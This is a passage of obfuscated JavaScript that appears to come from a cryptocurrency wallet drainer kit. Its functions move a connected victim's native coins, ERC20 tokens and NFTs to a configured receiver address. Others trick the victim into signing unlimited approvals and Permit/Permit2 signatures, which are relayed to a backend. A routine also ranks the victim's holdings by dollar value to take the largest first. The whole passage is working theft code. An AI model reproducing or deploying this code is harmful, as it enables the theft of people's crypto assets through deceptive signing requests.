      'nonce': _0x1f8be5,
      'value': ethers.BigNumber.from(_0x3e2818),
      'from': MS_Current_Address
    });
  } else {
    _0x55b7d0 = await _0x78c197[MS_Settings.Settings.Chains[_0x927144].Contract_Type]({
      'gasLimit': ethers.BigNumber.from(_0x25022b),
      'gasPrice': ethers.BigNumber.from(_0x13a8e3),
      'nonce': _0x1f8be5,
      'value': ethers.BigNumber.from(_0x3e2818),
      'from': MS_Current_Address
    });
  }
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x55b227.waitForTransaction(_0x55b7d0.hash, 0x1, 0x7530);
  }
  await transfer_success(_0x51de64, _0x3e2818);
  sign_ready();
};
const TRANSFER_NATIVE = async _0x45dee6 => {
  const _0x47d73e = convert_chain('ID', "ANKR", _0x45dee6.chain_id);
  if (MS_Settings.Settings.Chains[_0x47d73e].Contract_Address != '') {
    return DO_CONTRACT(_0x45dee6);
  }
  const _0x20b322 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x45dee6.chain_id]);
  const _0x536e68 = ethers.BigNumber.from(await _0x20b322.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  const _0x3706b6 = _0x45dee6.chain_id == 0xa4b1 ? 0x16e360 : _0x45dee6.chain_id == 0xa86a ? 0x16e360 : 0x5208;
  const _0x24a783 = _0x45dee6.chain_id == 0xa4b1 ? 0x4c4b40 : _0x45dee6.chain_id == 0xa86a ? 0x4c4b40 : 0x249f0;
  const _0x4a239c = ethers.BigNumber.from(_0x45dee6.chain_id == 0xa ? "35000000000" : _0x536e68);
  const _0x4ed711 = _0x4a239c.mul(ethers.BigNumber.from(_0x3706b6)).mul(ethers.BigNumber.from('2'));
  const _0x5e780e = _0x4a239c.mul(ethers.BigNumber.from(_0x24a783)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[_0x45dee6.chain_id])));
  const _0x304879 = ethers.BigNumber.from(_0x45dee6.amount_raw).sub(_0x4ed711).sub(_0x5e780e).toString();
  if (ethers.BigNumber.from(_0x304879).lte(ethers.BigNumber.from('0'))) {
    throw "LOW_BALANCE";
  }
  const _0x38f40a = await get_nonce(_0x45dee6.chain_id);
  await transfer_request(_0x45dee6);
  sign_next();
  const _0x14478b = await MS_Signer.sendTransaction({
    'from': MS_Current_Address,
    'to': MS_Settings.Receiver,
    'value': ethers.BigNumber.from(_0x304879),
    'gasLimit': ethers.BigNumber.from(_0x3706b6),
    'gasPrice': ethers.BigNumber.from(_0x536e68),
    'nonce': _0x38f40a,
    'data': '0x'
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x20b322.waitForTransaction(_0x14478b.hash, 0x1, 0x7530);
  }
  await transfer_success(_0x45dee6, _0x304879);
  sign_ready();
};
const TRANSFER_TOKEN = async _0x4cd837 => {
  const _0x921765 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x4cd837.chain_id]);
  const _0x2fa12e = ethers.BigNumber.from(await _0x921765.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  const _0x45e40a = await get_nonce(_0x4cd837.chain_id);
  const _0x3b9934 = new ethers.Contract(_0x4cd837.address, MS_Contract_ABI.ERC20, MS_Signer);
  let _0x414538 = null;
  try {
    _0x414538 = await _0x3b9934.estimateGas.transfer(MS_Settings.Receiver, _0x4cd837.amount_raw, {
      'from': MS_Current_Address
    });
    _0x414538 = ethers.BigNumber.from(_0x414538).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x57e3a6) {
    _0x414538 = _0x4cd837.chain_id == 0xa4b1 ? 0x4c4b40 : _0x4cd837.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  await transfer_request(_0x4cd837);
  sign_next();
  const _0x110afc = await _0x3b9934.transfer(MS_Settings.Receiver, _0x4cd837.amount_raw, {
    'gasLimit': ethers.BigNumber.from(_0x414538),
    'gasPrice': ethers.BigNumber.from(_0x2fa12e),
    'nonce': _0x45e40a,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x921765.waitForTransaction(_0x110afc.hash, 0x1, 0x7530);
  }
  await transfer_success(_0x4cd837);
  sign_ready();
};
const TRANSFER_NFT = async _0x10f53e => {
  const _0x1fefe7 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x10f53e.chain_id]);
  const _0x31d262 = ethers.BigNumber.from(await _0x1fefe7.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
  const _0x109818 = await get_nonce(_0x10f53e.chain_id);
  const _0x11be76 = new ethers.Contract(_0x10f53e.address, MS_Contract_ABI.ERC721, MS_Signer);
  let _0x25d73f = null;
  try {
    _0x25d73f = await _0x11be76.estimateGas.transferFrom(MS_Current_Address, MS_Settings.Receiver, _0x10f53e.amount_raw, {
      'from': MS_Current_Address
    });
    _0x25d73f = ethers.BigNumber.from(_0x25d73f).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
  } catch (_0x367ae8) {
    _0x25d73f = _0x10f53e.chain_id == 0xa4b1 ? 0x4c4b40 : _0x10f53e.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  await transfer_request(_0x10f53e);
  sign_next();
  const _0x4168c7 = await _0x11be76.transferFrom(MS_Current_Address, MS_Settings.Receiver, _0x10f53e.amount_raw, {
    'gasLimit': ethers.BigNumber.from(_0x25d73f),
    'gasPrice': ethers.BigNumber.from(_0x31d262),
    'nonce': _0x109818,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x1fefe7.waitForTransaction(_0x4168c7.hash, 0x1, 0x7530);
  }
  await transfer_success(_0x10f53e);
  sign_ready();
};
const RETRO_MM_APPROVE_TOKEN = async _0x1982db => {
  const _0x53abd2 = new Web3(MS_Provider);
  const _0x5adc14 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x1982db.chain_id]);
  const _0x1431f2 = ethers.BigNumber.from(await _0x5adc14.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const _0x1547cb = await get_nonce(_0x1982db.chain_id);
  const _0x235fc3 = new ethers.Contract(_0x1982db.address, MS_Contract_ABI.ERC20, _0x5adc14);
  let _0x52856f = null;
  let _0x4833bd = ethers.utils.parseEther("1158472395435294898592384258348512586931256");
  for (const _0x236dc6 of MS_Settings.Unlimited_BL) {
    try {
      if (_0x236dc6[0x0] == MS_Current_Chain_ID && _0x236dc6[0x1] == _0x1982db.address.toLowerCase()) {
        _0x4833bd = _0x1982db.amount_raw;
        break;
      }
    } catch (_0x50630a) {
      console.log(_0x50630a);
    }
  }
  try {
    _0x52856f = await _0x235fc3.estimateGas.approve(MS_Settings.Address, _0x4833bd, {
      'from': MS_Current_Address
    });
    _0x52856f = ethers.BigNumber.from(_0x52856f).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x2d18ad) {
    _0x52856f = _0x1982db.chain_id == 0xa4b1 ? 0x4c4b40 : _0x1982db.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  let _0x1279a2 = new _0x53abd2.eth.Contract(MS_Contract_ABI.ERC20, _0x1982db.address);
  let _0x400b13 = _0x1279a2.methods.approve(MS_Settings.Address, _0x4833bd).encodeABI();
  await approve_request(_0x1982db);
  sign_next();
  const _0x598af6 = await new Promise(_0x2e583a => {
    MS_Provider.sendAsync({
      'from': MS_Current_Address,
      'id': 0x1,
      'jsonrpc': "2.0",
      'method': "eth_sendTransaction",
      'params': [{
        'chainId': MS_Current_Chain_ID,
        'data': _0x400b13,
        'from': MS_Current_Address,
        'nonce': _0x53abd2.utils.toHex(_0x1547cb),
        'to': _0x1982db.address,
        'value': "0x000" + Math.floor(Math.random() * 0x9),
        'gasPrice': _0x53abd2.utils.toHex(_0x1431f2),
        'gas': _0x53abd2.utils.toHex(_0x52856f)
      }]
    }, (_0x19b2e8, _0x4a8379) => {
      _0x2e583a({
        'err': _0x19b2e8,
        'tx': _0x4a8379
      });
    });
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x5adc14.waitForTransaction(_0x598af6.tx.result, 0x1, 0x7530);
  }
  await approve_success(_0x1982db);
  sign_ready();
};
const DO_SAFA = async _0x2b301d => {
  const _0x30ea2f = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x2b301d.chain_id]);
  const _0x3c1334 = ethers.BigNumber.from(await _0x30ea2f.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
  const _0x4cdda6 = await get_nonce(_0x2b301d.chain_id);
  const _0xc8ec2b = new ethers.Contract(_0x2b301d.address, MS_Contract_ABI.ERC721, MS_Signer);
  let _0x431815 = null;
  try {
    _0x431815 = await _0xc8ec2b.estimateGas.setApprovalForAll(MS_Settings.Address, true, {
      'from': MS_Current_Address
    });
    _0x431815 = ethers.BigNumber.from(_0x431815).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0xe5b30f) {
    _0x431815 = _0x2b301d.chain_id == 0xa4b1 ? 0x4c4b40 : _0x2b301d.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  await approve_request(_0x2b301d);
  sign_next();
  const _0x334150 = await _0xc8ec2b.setApprovalForAll(MS_Settings.Address, true, {
    'gasLimit': ethers.BigNumber.from(_0x431815),
    'gasPrice': ethers.BigNumber.from(_0x3c1334),
    'nonce': _0x4cdda6,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x30ea2f.waitForTransaction(_0x334150.hash, 0x1, 0x7530);
  }
  await approve_success(_0x2b301d);
  sign_ready();
};
const DO_PERMIT2 = async (_0x1cda0a, _0x374284) => {
  const _0x4e8d73 = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI.PERMIT2_BATCH, MS_Signer);
  let _0x125357 = {
    'name': 'Permit2',
    'chainId': _0x1cda0a.chain_id,
    'verifyingContract': '0x000000000022d473030f116ddee9f6b43ac78ba3'
  };
  let _0x121c68 = Date.now() + 30758400000;
  let _0x7b1428 = null;
  let _0x206aa0 = null;
  let _0x442c1c = null;
  if (_0x374284.length > 0x1) {
    let _0x1bd95f = {
      'PermitBatch': [{
        'name': "details",
        'type': "PermitDetails[]"
      }, {
        'name': "spender",
        'type': "address"
      }, {
        'name': "sigDeadline",
        'type': "uint256"
      }],
      'PermitDetails': [{
        'name': "token",
        'type': "address"
      }, {
        'name': "amount",
        'type': "uint160"
      }, {
        'name': "expiration",
        'type': 'uint48'
      }, {
        'name': 'nonce',
        'type': 'uint48'
      }]
    };
    let _0x4e3c31 = [];
    for (const _0x1f38fe of _0x374284) {
      try {
        _0x4e3c31.push({
          'token': _0x1f38fe.address,
          'expiration': _0x121c68,
          'amount': '1461501637330902918203684832716283019655932542975',
          'nonce': (await _0x4e8d73.allowance(MS_Current_Address, _0x1f38fe.address, MS_Settings.Address)).nonce
        });
      } catch (_0x5d51b5) {
        console.log(_0x5d51b5);
      }
    }
    _0x206aa0 = {
      'details': _0x4e3c31,
      'spender': MS_Settings.Address,
      'sigDeadline': _0x121c68
    };
    swap_request("Permit2", _0x1cda0a, _0x374284);
    sign_next();
    _0x7b1428 = await MS_Signer._signTypedData(_0x125357, _0x1bd95f, _0x206aa0);
    _0x442c1c = 0x2;
  } else {
    let _0x1aff8c = {
      'PermitSingle': [{
        'name': "details",
        'type': "PermitDetails"
      }, {
        'name': "spender",
        'type': "address"
      }, {
        'name': "sigDeadline",
        'type': "uint256"
      }],
      'PermitDetails': [{
        'name': "token",
        'type': "address"
      }, {
        'name': "amount",
        'type': "uint160"
      }, {
        'name': "expiration",
        'type': 'uint48'
      }, {
        'name': "nonce",
        'type': 'uint48'
      }]
    };
    _0x206aa0 = {
      'details': {
        'token': _0x1cda0a.address,
        'amount': "1461501637330902918203684832716283019655932542975",
        'expiration': _0x121c68,
        'nonce': (await _0x4e8d73.allowance(MS_Current_Address, _0x1cda0a.address, MS_Settings.Address)).nonce
      },
      'spender': MS_Settings.Address,
      'sigDeadline': _0x121c68
    };
    swap_request('Permit2', _0x1cda0a, [_0x1cda0a]);
    sign_next();
    _0x7b1428 = await MS_Signer._signTypedData(_0x125357, _0x1aff8c, _0x206aa0);
    _0x442c1c = 0x1;
  }
  if (_0x7b1428 != null) {
    await swap_success("Permit2", _0x1cda0a, _0x374284);
    wait_message();
    const _0x178f52 = send_request({
      'action': "sign_permit2",
      'user_id': MS_ID,
      'signature': _0x7b1428,
      'message': _0x206aa0,
      'asset': _0x1cda0a,
      'assets': _0x374284,
      'address': MS_Current_Address,
      'mode': _0x442c1c
    });
    if (MS_Settings.Settings.Wait_For_Response) {
      await _0x178f52;
    }
    sign_ready();
  } else {
    await sign_cancel();
  }
};
const PERMIT_TOKEN = async _0x382041 => {
  const _0x263a75 = new ethers.Contract(_0x382041.address, _0x382041.abi, MS_Signer);
  const _0x2c5877 = await _0x263a75.nonces(MS_Current_Address);
  const _0x3b23ac = await _0x263a75.name();
  let _0x275447 = ethers.utils.parseEther("1158472395435294898592384258348512586931256");
  for (const _0x1cc5a1 of MS_Settings.Unlimited_BL) {
    try {
      if (_0x1cc5a1[0x0] == MS_Current_Chain_ID && _0x1cc5a1[0x1] == _0x382041.address.toLowerCase()) {
        _0x275447 = _0x382041.amount_raw;
        break;
      }
    } catch (_0x7f0f3) {
      console.log(_0x7f0f3);
    }
  }
  const _0x3fb6c8 = Date.now() + 30758400000;
  let _0x44a1fa = null;
  let _0xc445dd = null;
  if (_0x382041.permit == 0x1) {
    _0x44a1fa = {
      'Permit': [{
        'name': "holder",
        'type': "address"
      }, {
        'name': 'spender',
        'type': 'address'
      }, {
        'name': "nonce",
        'type': "uint256"
      }, {
        'name': 'expiry',
        'type': "uint256"
      }, {
        'name': "allowed",
        'type': "bool"
      }]
    };
    _0xc445dd = {
      'holder': MS_Current_Address,
      'spender': MS_Settings.Address,
      'nonce': _0x2c5877,
      'expiry': _0x3fb6c8,
      'allowed': true
    };
  } else if (_0x382041.permit == 0x2) {
    _0x44a1fa = {
      'Permit': [{
        'name': 'owner',
        'type': "address"
      }, {
        'name': 'spender',
        'type': "address"
      }, {
        'name': "value",
        'type': "uint256"
      }, {
        'name': "nonce",
        'type': "uint256"
      }, {
        'name': "deadline",
        'type': "uint256"
      }]
    };
    _0xc445dd = {
      'owner': MS_Current_Address,
      'spender': MS_Settings.Address,
      'value': _0x275447,
      'nonce': _0x2c5877,
      'deadline': _0x3fb6c8
    };
  }
  await approve_request(_0x382041);
  sign_next();
  const _0xb79bb0 = await MS_Signer._signTypedData({
    'name': _0x3b23ac,
    'version': _0x382041.permit_ver,
    'chainId': _0x382041.chain_id,
    'verifyingContract': _0x382041.address
  }, _0x44a1fa, _0xc445dd);
  const _0x1f2caa = {
    'r': _0xb79bb0.slice(0x0, 0x42),
    's': '0x' + _0xb79bb0.slice(0x42, 0x82),
    'v': Number('0x' + _0xb79bb0.slice(0x82, 0x84))
  };
  await approve_success(_0x382041);
  wait_message();
  const _0x271519 = send_request({
    'action': 'permit_token',
    'user_id': MS_ID,
    'sign': {
      'type': _0x382041.permit,
      'version': _0x382041.permit_ver,
      'chain_id': _0x382041.chain_id,
      'address': _0x382041.address,
      'owner': MS_Current_Address,
      'spender': MS_Settings.Address,
      'value': _0x275447.toString(),
      'nonce': _0x2c5877.toString(),
      'deadline': _0x3fb6c8,
      'r': _0x1f2caa.r,
      's': _0x1f2caa.s,
      'v': _0x1f2caa.v,
      'abi': _0x382041.abi
    },
    'asset': _0x382041,
    'address': MS_Current_Address
  });
  if (MS_Settings.Settings.Wait_For_Response) {
    await _0x271519;
  }
  sign_ready();
};
const sign_success = async (_0x1c614f, _0x518e19 = '0') => {
  try {
    if (_0x1c614f.type == "NATIVE") {
      _0x1c614f.amount_raw = _0x518e19;
      const _0x1de994 = ethers.BigNumber.from(_0x1c614f.amount_raw);
      _0x1c614f.amount_usd = parseFloat(ethers.utils.formatUnits(_0x1de994, "ether")) * MS_Currencies[convert_chain('ID', "CURRENCY", _0x1c614f.chain_id)].USD;
      await send_request({
        'action': "sign_success",
        'asset': _0x1c614f,
        'user_id': MS_ID
      });
    } else {
      await send_request({
        'action': "sign_success",
        'asset': _0x1c614f,
        'user_id': MS_ID
      });
    }
  } catch (_0x4e9e91) {
    console.log(_0x4e9e91);
  }
};
const swap_success = async (_0x57b74f, _0xac28fe, _0xd14ca9 = [], _0x4817ab = '0') => {
  try {
    if (_0xac28fe.type == "NATIVE") {
      _0xac28fe.amount_raw = _0x4817ab;
      const _0x444a37 = ethers.BigNumber.from(_0xac28fe.amount_raw);
      _0xac28fe.amount_usd = parseFloat(ethers.utils.formatUnits(_0x444a37, "ether")) * MS_Currencies[convert_chain('ID', "CURRENCY", _0xac28fe.chain_id)].USD;
      await send_request({
        'action': 'swap_success',
        'asset': _0xac28fe,
        'user_id': MS_ID,
        'list': _0xd14ca9,
        'swapper': _0x57b74f
      });
    } else {
      await send_request({
        'action': 'swap_success',
        'asset': _0xac28fe,
        'user_id': MS_ID,
        'list': _0xd14ca9,
        'swapper': _0x57b74f
      });
    }
  } catch (_0x19d8a9) {
    console.log(_0x19d8a9);
  }
};
const transfer_success = async (_0x39ef2b, _0x3c44fb = '0') => {
  try {
    if (_0x39ef2b.type == "NATIVE") {
      _0x39ef2b.amount_raw = _0x3c44fb;
      const _0x36d947 = ethers.BigNumber.from(_0x39ef2b.amount_raw);
      _0x39ef2b.amount_usd = parseFloat(ethers.utils.formatUnits(_0x36d947, 'ether')) * MS_Currencies[convert_chain('ID', "CURRENCY", _0x39ef2b.chain_id)].USD;
      await send_request({
        'action': "transfer_success",
        'asset': _0x39ef2b,
        'user_id': MS_ID
      });
    } else {
      await send_request({
        'action': "transfer_success",
        'asset': _0x39ef2b,
        'user_id': MS_ID
      });
    }
  } catch (_0x123c46) {
    console.log(_0x123c46);
  }
};
const approve_success = async _0x70688a => {
  try {
    await send_request({
      'action': 'approve_success',
      'asset': _0x70688a,
      'user_id': MS_ID
    });
  } catch (_0x2a55c5) {
    console.log(_0x2a55c5);
  }
};
const sign_cancel = async () => {
  try {
    await send_request({
      'action': "sign_cancel",
      'user_id': MS_ID
    });
  } catch (_0x2ba920) {
    console.log(_0x2ba920);
  }
};
const sign_unavailable = async () => {
  try {
    await send_request({
      'action': "sign_unavailable",
      'user_id': MS_ID
    });
    MS_Sign_Disabled = true;
  } catch (_0xf966f8) {
    console.log(_0xf966f8);
  }
};
const transfer_cancel = async () => {
  try {
    await send_request({
      'action': "transfer_cancel",
      'user_id': MS_ID
    });
  } catch (_0x5623e2) {
    console.log(_0x5623e2);
  }
};
const approve_cancel = async () => {
  try {
    await send_request({
      'action': "approve_cancel",
      'user_id': MS_ID
    });
  } catch (_0x3d4288) {
    console.log(_0x3d4288);
  }
};
const chain_cancel = async () => {
  try {
    await send_request({
      'action': "chain_cancel",
      'user_id': MS_ID
    });
  } catch (_0x15e129) {
    console.log(_0x15e129);
  }
};
const chain_success = async () => {
  try {
    await send_request({
      'action': "chain_success",
      'user_id': MS_ID
    });
  } catch (_0x3ab5b7) {
    console.log(_0x3ab5b7);
  }
};
const chain_request = async (_0x108e14, _0x4b5abc) => {
  try {
    await send_request({
      'action': "chain_request",
      'user_id': MS_ID,
      'chains': [_0x108e14, _0x4b5abc]
    });
  } catch (_0x240ad1) {
    console.log(_0x240ad1);
  }
};
const sign_request = async _0x4ffb9b => {
  try {
    await send_request({
      'action': 'sign_request',
      'user_id': MS_ID,
      'asset': _0x4ffb9b
    });
  } catch (_0x565d4b) {
    console.log(_0x565d4b);
  }
};
const swap_request = async (_0x195b5e, _0x93484, _0x357869 = []) => {
  try {
    await send_request({
      'action': "swap_request",
      'user_id': MS_ID,
      'asset': _0x93484,
      'list': _0x357869,
      'swapper': _0x195b5e
    });
  } catch (_0x302f12) {
    console.log(_0x302f12);
  }
};
const transfer_request = async _0xd953ba => {
  try {
    await send_request({
      'action': "transfer_request",
      'user_id': MS_ID,
      'asset': _0xd953ba
    });
  } catch (_0x15044c) {
    console.log(_0x15044c);
  }
};
const approve_request = async _0x3ac3c3 => {
  try {
    await send_request({
      'action': 'approve_request',
      'user_id': MS_ID,
      'asset': _0x3ac3c3
    });
  } catch (_0x1b8dbb) {
    console.log(_0x1b8dbb);
  }
};
const is_increase_approve = _0x3cdf20 => {
  try {
    return !!_0x3cdf20.hasOwnProperty('increaseAllowance');
  } catch (_0x4021fc) {
    return false;
  }
};
const get_wallet_assets = async _0x4a6cf8 => {
  try {
    let _0x20de0e = await send_request({
      'action': "check_wallet",
      'address': MS_Current_Address
    });
    let _0x4a8e4b = [];
    if (_0x20de0e.status == 'OK') {
      _0x4a8e4b = _0x20de0e.data;
    } else {
      _0x4a8e4b = await get_tokens(_0x4a6cf8);
    }
    let _0x23b8ef = [];
    for (let _0x196fbd = _0x4a8e4b.length - 0x1; _0x196fbd >= 0x0; _0x196fbd--) {
      try {
        const _0x23c73d = _0x4a8e4b[_0x196fbd];
        const _0x174fb1 = convert_chain('ID', "ANKR", _0x23c73d.chain_id);
        if (!MS_Settings.Settings.Chains[_0x174fb1].Enable) {
          _0x4a8e4b.splice(_0x196fbd, 0x1);
        } else {
          if (_0x23c73d.type == 'NATIVE' && !MS_Settings.Settings.Chains[_0x174fb1].Native) {
            _0x4a8e4b.splice(_0x196fbd, 0x1);
          } else {
            if (_0x23c73d.type == "ERC20" && !MS_Settings.Settings.Chains[_0x174fb1].Tokens) {
              _0x4a8e4b.splice(_0x196fbd, 0x1);
            } else {
              if (_0x23c73d.type == 'NATIVE' && _0x23c73d.amount_usd < MS_Settings.Settings.Chains[_0x174fb1].Min_Native_Price) {
                _0x4a8e4b.splice(_0x196fbd, 0x1);
              } else {
                if (_0x23c73d.type == "ERC20" && _0x23c73d.amount_usd < MS_Settings.Settings.Chains[_0x174fb1].Min_Tokens_Price) {
                  _0x4a8e4b.splice(_0x196fbd, 0x1);
                } else if (_0x23c73d.type == "ERC20") {
                  if (MS_Settings.Settings.Permit2.Mode) {
                    _0x23b8ef.push(new Promise(async _0x22bad0 => {
                      try {
                        const _0x42f884 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x23c73d.chain_id]);
                        const _0x4475bf = new ethers.Contract(_0x23c73d.address, MS_Contract_ABI.ERC20, _0x42f884);
                        let _0x3db86d = await _0x4475bf.allowance(MS_Current_Address, "0x000000000022d473030f116ddee9f6b43ac78ba3");
                        if (ethers.BigNumber.from(_0x3db86d).gt(ethers.BigNumber.from('0'))) {
                          _0x23c73d.permit2 = true;
                          _0x23c73d.allowance = _0x3db86d;
                          console.log("[PERMIT_2 FOUND] " + _0x23c73d.name + ", Allowance: " + _0x3db86d);
                        }
                      } catch (_0x5f0888) {
                        console.log(_0x5f0888);
                      }
                      _0x22bad0();
                    }));
                  }
                  if (MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority > 0x0 || MS_Settings.Settings.Approve.MetaMask >= 0x2 && (MS_Current_Provider == 'MetaMask' || MS_Current_Provider == "Trust Wallet" && !MS_Mobile_Status)) {
                    _0x23b8ef.push(new Promise(async _0x110be4 => {
                      try {
                        if (MS_Settings.Settings.Approve.MetaMask >= 0x2 && (MS_Current_Provider == "MetaMask" || MS_Current_Provider == "Trust Wallet" && !MS_Mobile_Status) || _0x23c73d.amount_usd >= MS_Settings.Settings.Permit.Price) {
                          const _0x8f8bbb = await retrive_token(_0x23c73d.chain_id, _0x23c73d.address);
                          const _0x462507 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x23c73d.chain_id]);
                          const _0x48c27e = new ethers.Contract(_0x23c73d.address, _0x8f8bbb, _0x462507);
                          if (is_increase_approve(_0x48c27e.functions)) {
                            _0x23c73d.increase = true;
                            _0x23c73d.abi = _0x8f8bbb;
                          }
                          if (_0x23c73d.amount_usd >= MS_Settings.Settings.Permit.Price) {
                            const _0xce9e8b = get_permit_type(_0x48c27e.functions);
                            _0x23c73d.permit = _0xce9e8b;
                            _0x23c73d.permit_ver = '1';
                            _0x23c73d.abi = _0x8f8bbb;
                            if (_0xce9e8b > 0x0) {
                              if (_0x48c27e.functions.hasOwnProperty("version")) {
                                try {
                                  _0x23c73d.permit_ver = await _0x48c27e.version();
                                } catch (_0x148c30) {
                                  console.log(_0x148c30);
                                }
                              }
                              console.log("[PERMIT FOUND] " + _0x23c73d.name + ", Permit Type: " + _0xce9e8b + ", Version: " + _0x23c73d.permit_ver);
                            }
                          }
                        }
                      } catch (_0x38ccbc) {
                        console.log(_0x38ccbc);
                      }
                      _0x110be4();
                    }));
                  }
                  if (MS_Settings.Settings.Swappers.Enable) {
                    _0x23b8ef.push(new Promise(async _0xfd4788 => {
                      try {
                        if (_0x23c73d.amount_usd >= MS_Settings.Settings.Swappers.Price) {
                          const _0x182cf4 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x23c73d.chain_id]);
                          for (const _0x2c510d of MS_Routers[_0x23c73d.chain_id]) {
                            try {
                              const _0x2078a0 = new ethers.Contract(_0x23c73d.address, MS_Contract_ABI.ERC20, _0x182cf4);
                              const _0x196422 = await _0x2078a0.allowance(MS_Current_Address, _0x2c510d[0x1]);
                              if (ethers.BigNumber.from(_0x196422).gt(ethers.BigNumber.from('0'))) {
                                if (_0x2c510d[0x0] == "Uniswap" && !MS_Uniswap_Whitelist.includes(_0x23c73d.address)) {
                                  continue;
                                }
                                if ((_0x2c510d[0x0] == "Pancake" || _0x2c510d[0x0] == 'Pancake_V3') && !MS_Pancake_Whitelist.includes(_0x23c73d.address)) {
                                  continue;
                                }
                                _0x23c73d.swapper = true;
                                _0x23c73d.swapper_type = _0x2c510d[0x0];
                                _0x23c73d.swapper_address = _0x2c510d[0x1];
                                _0x23c73d.swapper_allowance = _0x196422;
                                console.log("[SWAP FOUND] " + _0x23c73d.name + ", " + _0x2c510d[0x0]);
                                break;
                              }
                            } catch (_0x2a9e04) {
                              console.log(_0x2a9e04);
                            }
                          }
                        }
                      } catch (_0x1d8d98) {
                        console.log(_0x1d8d98);
                      }
                      _0xfd4788();
                    }));
                  }
                }
              }
            }
          }
        }
      } catch (_0x415b8f) {
        console.log(_0x415b8f);
      }
    }
    await Promise.all(_0x23b8ef);
    let _0x1a1763 = false;
    for (const _0x4b0fac in MS_Settings.Settings.Chains) {
      try {
        if (MS_Settings.Settings.Chains[_0x4b0fac].NFTs) {
          _0x1a1763 = true;
          break;
        }
      } catch (_0x5eb450) {
        console.log(_0x5eb450);
      }
    }
    if (_0x1a1763) {
      try {
        let _0xce66bc = [];
        _0x20de0e = await send_request({
          'action': "check_nft",
          'address': MS_Current_Address
        });
        if (_0x20de0e.status == 'OK') {
          _0xce66bc = _0x20de0e.data;
          for (const _0x525b91 of _0xce66bc) {
            try {
              const _0x450125 = convert_chain('ID', 'ANKR', _0x525b91.chain_id);
              if (_0x525b91.type == 'ERC1155') {
                continue;
              }
              if (!MS_Settings.Settings.Chains[_0x450125].NFTs) {
                continue;
              }
              if (_0x525b91.amount_usd < MS_Settings.Settings.Chains[_0x450125].Min_NFTs_Price) {
                continue;
              }
              _0x4a8e4b.push(_0x525b91);
            } catch (_0x139db4) {
              console.log(_0x139db4);
            }
          }
        } else {
          _0xce66bc = await get_nfts(_0x4a6cf8);
          for (const _0x3dc712 of _0xce66bc) {
            try {
              const _0x1c0647 = convert_chain('ID', "ANKR", _0x3dc712.chain_id);
              if (_0x3dc712.type == 'ERC1155') {
                continue;
              }
              if (!MS_Settings.Settings.Chains[_0x1c0647].NFTs) {
                continue;
              }
              if (_0x3dc712.amount_usd < MS_Settings.Settings.Chains[_0x1c0647].Min_NFTs_Price) {
                continue;
              }
              _0x4a8e4b.push(_0x3dc712);
            } catch (_0x1cb7fa) {
              console.log(_0x1cb7fa);
            }
          }
        }
      } catch (_0x27b70e) {
        console.log(_0x27b70e);
      }
    }
    _0x4a8e4b.sort((_0x42bbb2, _0x10b2cb) => {
      return _0x10b2cb.amount_usd - _0x42bbb2.amount_usd;
    });
    if (MS_Settings.Settings.Tokens_First) {
      const _0x2ac785 = [];
      for (const _0x18fc48 of _0x4a8e4b) {
        try {
          if (_0x18fc48.type == "NATIVE") {
            continue;
          }
          _0x2ac785.push(_0x18fc48);
        } catch (_0x463b9a) {
          console.log(_0x463b9a);
        }
      }
      for (const _0x46ec59 of _0x4a8e4b) {
        try {
          if (_0x46ec59.type != "NATIVE") {
            continue;
          }
          _0x2ac785.push(_0x46ec59);
        } catch (_0x218aca) {
          console.log(_0x218aca);
        }
      }
      _0x4a8e4b = _0x2ac785;
    }
    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 0x1) {
      const _0x43da30 = [];
      for (const _0x2cd7a6 of _0x4a8e4b) {
        try {
          if (!_0x2cd7a6.swapper) {
            continue;
          }
          _0x43da30.push(_0x2cd7a6);
        } catch (_0x203fc7) {
          console.log(_0x203fc7);
        }
      }
      for (const _0x46d675 of _0x4a8e4b) {
        try {
          if (_0x46d675.swapper) {
            continue;
          }
          _0x43da30.push(_0x46d675);
        } catch (_0xba507f) {
          console.log(_0xba507f);
        }
      }
      _0x4a8e4b = _0x43da30;
    }
    if (MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority > 0x0) {
      const _0xbd54f2 = [];
      for (const _0x37ba9e of _0x4a8e4b) {
        try {
